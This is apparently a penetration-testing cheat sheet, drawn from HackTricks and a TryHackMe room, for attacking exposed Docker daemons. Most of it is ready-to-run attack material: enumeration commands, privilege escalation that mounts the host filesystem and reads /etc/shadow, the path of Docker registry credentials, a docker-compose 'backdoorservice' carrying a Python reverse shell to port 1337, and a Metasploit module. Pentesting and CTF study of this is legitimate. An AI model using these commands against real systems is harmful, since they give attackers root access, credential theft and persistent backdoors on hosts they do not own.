# Docker

Default port: `2375/tcp` and `2376/tcp` over TLS

## Enumeration

### Nmap

```bash
nmap -sV --script "docker-*" -p 2375,2376 TARGET_IP
```

### Get version

Using curl

```bash
curl -s http://TARGET_IP:2375/version | jq
```

Using docker

```bash
docker -H TARGET_IP:2375 version
```

### Docker Credentials file

Credentials for a docker registry:

`/root/.docker/config.json`

## CLI - Basic commands

### Download container images

```bash
apt update
docker pull SOURCE:latest
```

### Run container image

```bash
docker run -it SOURCE:latest
```

### Download container image source

```bash
docker save -o image.tar SOURCE:latest
```

### Analyse container image

```bash
tar -xvf image.tar
cat manifest.json | jq
```

### Privilege escalation

```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```

or

```bash
docker -H TARGET_IP:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```

### Docker reverse shell

`nano docker-compose.yml`

```docker
version: "2.1"
services:
  backdoorservice:
    restart: always
    image: ghcr.io/jroo1053/ctfscore:master
    entrypoint: > 
       python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
       s.connect(("TARGET_IP",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
       pty.spawn("/bin/sh")'
    volumes:
      - /:/mnt
    privileged: true
```

Run the reverse shell:

`docker-compose up`

## Msf

```bash
use exploit/linux/http/docker_daemon_tcp
```

## Source

- <https://book.hacktricks.xyz/pentesting/2375-pentesting-docker#basic-commands>
- <https://tryhackme.com/room/idsevasion>
